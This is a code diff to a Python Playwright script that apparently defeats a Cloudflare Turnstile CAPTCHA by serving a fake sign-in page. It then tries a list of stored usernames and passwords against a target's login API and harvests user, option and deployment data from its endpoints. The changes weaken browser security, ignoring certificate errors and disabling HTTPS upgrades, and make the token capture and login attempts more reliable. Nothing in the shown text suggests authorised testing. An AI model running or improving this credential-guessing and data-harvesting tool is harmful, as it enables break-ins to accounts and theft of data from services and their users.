@@ -75,11 +75,12 @@ def solve_once(p, proxy_cfg, budget, tag):
     """Launch browser, serve minimal page at TARGET/sign-in, wait for a token."""
     args = ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
             "--disable-blink-features=AutomationControlled",
-            "--disable-features=CalculateNativeWinOcclusion",
+            "--disable-features=CalculateNativeWinOcclusion,HttpsUpgrades,HttpsFirstBalancedModeAutoEnable,HttpsFirstModeV2",
+            "--ignore-certificate-errors", "--allow-running-insecure-content",
             "--lang=en-US", "--window-size=1280,900"]
     kw = dict(channel="chrome", headless=False, args=args)
     if proxy_cfg:
-        kw["proxy"] = {"server": proxy_cfg}
+        kw["proxy"] = proxy_cfg if isinstance(proxy_cfg, dict) else {"server": proxy_cfg}
     browser = p.chromium.launch(**kw)
     ctx = browser.new_context(user_agent=UA, locale="en-US", timezone_id="America/New_York",
                               viewport={"width": 1280, "height": 900}, ignore_https_errors=True)
@@ -95,13 +96,15 @@ def solve_once(p, proxy_cfg, budget, tag):
     page.on("console", on_console)
     page.on("requestfailed", lambda r: reqlog.append("%s %s" % (r.url[:90], r.failure)))
 
+    TARGET_HTTPS = TARGET.replace("http://", "https://")
+
     def route(r):
         u = r.request.url
-        if u.startswith(TARGET) and r.request.resource_type == "document":
+        if (u.startswith(TARGET) or u.startswith(TARGET_HTTPS)) and r.request.resource_type == "document":
             r.fulfill(status=200, content_type="text/html; charset=utf-8", body=MINI)
         elif "challenges.cloudflare.com" in u:
             r.continue_()
-        elif u.startswith(TARGET):
+        elif u.startswith(TARGET) or u.startswith(TARGET_HTTPS):
             r.continue_()
         else:
             r.abort()
@@ -126,7 +129,7 @@ def solve_once(p, proxy_cfg, budget, tag):
         if tok:
             break
         # try clicking the widget checkbox every ~15s
-        if time.time() - t0 > 12 and clicked < 4 and int(time.time() - t0) % 15 < 2:
+        if clicked < 8 and (time.time() - t0) > (8 + clicked * 9):
             try:
                 ifr = page.query_selector("iframe")
                 if ifr:
@@ -141,6 +144,10 @@ def solve_once(p, proxy_cfg, budget, tag):
             last_frames = [f.url[:110] for f in page.frames]
         except Exception:
             pass
+        el = time.time() - t0
+        if el > 22 and (not last_frames or all((f.startswith("chrome-error") or f.startswith("about:")) for f in last_frames)):
+            log(tag, "early-abort: no real document/widget, frames=", last_frames)
+            break
         time.sleep(2)
 
     info = {"tag": tag, "token_len": len(tok), "elapsed": round(time.time() - t0, 1),
@@ -160,7 +167,7 @@ def do_login(page, tok, results):
     for u, pw in CREDS:
         js = """async (a) => {
             try{
-              const r = await fetch('/api/user/login?turnstile=' + encodeURIComponent(a.tok), {
+              const r = await fetch(a.base + '/api/user/login?turnstile=' + encodeURIComponent(a.tok), {
                 method:'POST', credentials:'include',
                 headers:{'Content-Type':'application/json','Accept':'application/json'},
                 body: JSON.stringify({username:a.u, password:a.p})
@@ -170,7 +177,7 @@ def do_login(page, tok, results):
             }catch(e){ return {status:-1, body:String(e)}; }
         }"""
         try:
-            res = page.evaluate(js, {"tok": tok, "u": u, "p": pw})
+            res = page.evaluate(js, {"tok": tok, "u": u, "p": pw, "base": TARGET})
         except Exception as e:
             res = {"status": -2, "body": str(e)[:200]}
         attempts.append({"u": u, "p": pw[:6] + "...", "status": res.get("status"), "body": res.get("body", "")[:400]})
@@ -186,14 +193,14 @@ def do_login(page, tok, results):
 
 def harvest(page, uid, results):
     def get(path, extra=None):
-        js = """async (a) => { const r = await fetch(a.p, {credentials:'include', headers:a.h||{}});
+        js = """async (a) => { const r = await fetch(a.base + a.p, {credentials:'include', headers:a.h||{}});
             const t = await r.text(); return {status:r.status, body:t.slice(0,4000)}; }"""
         h = {"Accept": "application/json"}
         if uid:
             h["New-API-User"] = str(uid)
         if extra:
             h.update(extra)
-        return page.evaluate(js, {"p": path, "h": h})
+        return page.evaluate(js, {"p": path, "h": h, "base": TARGET})
 
     out = {}
     for path in ["/api/user/self", "/api/option/", "/api/deployments", "/api/user/?p=1&page_size=20",
